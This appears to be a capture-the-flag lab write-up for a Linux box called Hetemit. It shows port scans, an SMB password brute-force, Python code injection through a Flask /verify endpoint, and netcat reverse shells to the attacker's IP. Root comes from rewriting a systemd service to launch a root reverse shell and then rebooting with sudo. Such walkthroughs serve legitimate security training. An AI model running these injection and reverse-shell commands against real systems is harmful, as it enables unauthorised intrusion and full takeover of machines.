## Initial Foothold

Autorecon `192.168.45.212`

```
PORT      STATE SERVICE      REASON         VERSION
21/tcp    open  ftp          syn-ack ttl 61 vsftpd 3.0.3
22/tcp    open  ssh          syn-ack ttl 61 OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http         syn-ack ttl 61 Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
| http-methods: 
139/tcp   open  netbios-ssn? syn-ack ttl 61
445/tcp   open  netbios-ssn  syn-ack ttl 61 Samba smbd 4
18000/tcp open  biimenu?     syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines: 
|_    HTTP/1.1 400 Bad Request
50000/tcp open  http         syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

Ports
- 21 (ftp) - anonymous login allowed but it is in passive mode
- 139, 445 (smb) - anonymous share listing. Saw cmeeks files. Found user cmeeks with enum4linux
```
┌──(kali㉿kali)-[~/offsec/hetemit]
└─$ smbclient //192.168.229.117/Cmeeks -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

# Try to bruteforce crack the password.
└─$ netexec smb 192.168.229.117 -u cmeeks -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --verbose
```

- 80 (web) - Nothing with feroxbuster at the moment. Default apache page and server is powered by CentOS in `/noindex`. Could potentially use an exploit targeting CentOS
```
http://192.168.229.117
http://192.168.229.117/noindex/
```
- 50000 (web) - Nothing with feroxbuster. `/generate` and `/verify` leads to nothing.
```
http://192.168.229.117:50000/generate
{'email@domain'}
http://192.168.229.117:50000/verify
{'code'}
```
- 18000 (web) - very laggy to enumerate. We cannot do anything with the login page as there is no error message. `admin:admin` and `cmeeks:cmeeks` did not work. The /users/new page need an invite code which we do not have. Tested time-based sqli on all fields and nothing really works.
```
http://192.168.229.117:18000/users/new
http://192.168.229.117:18000/
http://192.168.229.117:18000/login
```

Needed to cheat because I am really stuck. Apparently we can send data with their given format
```
┌──(kali㉿kali)-[~/offsec/hetemit]
└─$ curl -i --data "email@domain=test@test.com" http://192.168.229.117:50000/generate
HTTP/1.0 400 BAD REQUEST
Content-Type: text/html; charset=utf-8
Content-Length: 192
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Sun, 22 Nov 2026 15:30:38 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>

┌──(kali㉿kali)-[~/offsec/hetemit]
└─$ curl -i --data "code=test" http://192.168.229.117:50000/verify
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Sun, 22 Nov 2026 15:31:05 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
   
```
- **`--data "..."`** — sends the request as a **POST** with a body (using `--data` automatically makes it POST and sets `Content-Type: application/x-www-form-urlencoded`).
- **`email@domain=test@test.com`** — the form data being submitted. This is a key-value pair: the parameter name is `email@domain` and the value is `test@test.com`. (The `[...](mailto:...)` markdown formatting in your paste is just your terminal/editor auto-linkifying the email — the actual sent data is the plain `key=value`.)

Internal server seems interesting. We try to dig deeper and realise it is executing our command.
```
┌──(kali㉿kali)-[~/offsec/hetemit]
└─$ curl -i --data "code=whoami" http://192.168.229.117:50000/verify  
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Sun, 22 Nov 2026 15:36:28 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

┌──(kali㉿kali)-[~/offsec/hetemit]
└─$ curl -i --data "code=id" http://192.168.229.117:50000/verify
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 22
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Sun, 22 Nov 2026 15:36:33 GMT

<built-in function id>                               
```

Google searching `<built-in function id>`, we realise its a python command. So, we can test out os.system. Looks like its working. Then we can open up penelope and send a reverse shell back.
```
┌──(kali㉿kali)-[~/offsec/hetemit]
└─$ curl -i --data 'code=os.system("whoami")' http://192.168.229.117:50000/verify
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Sun, 22 Nov 2026 15:52:30 GMT


└─$ curl -i --data 'code=os.system("nc 192.168.45.212 18000 -e /bin/bash")' http://192.168.229.117:50000/verify  
```

Reverse shell caught. However it seems that some of the rev shell commands do not work. 
`nc -e` works.

## Privesc

We check SUID and capabilities and seems theres is nothing we can exploit.

So we ran linpeas. We realise we have sudo on `/sbin/reboot` from linpeas. This probably means that we are writing over a system file and rebooting the system. Else, we have connection to port 5432 (postgres) which we can hunt credentials for in linpeas. 
```
/etc/systemd/system/pythonapp.service

[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=nc 192.168.45.212 80 -e /bin/bash
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=nc 192.168.45.212 80 -e /bin/bash
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Run `sudo /sbin/reboot` and we get a clean rooted penelope shell at port 80.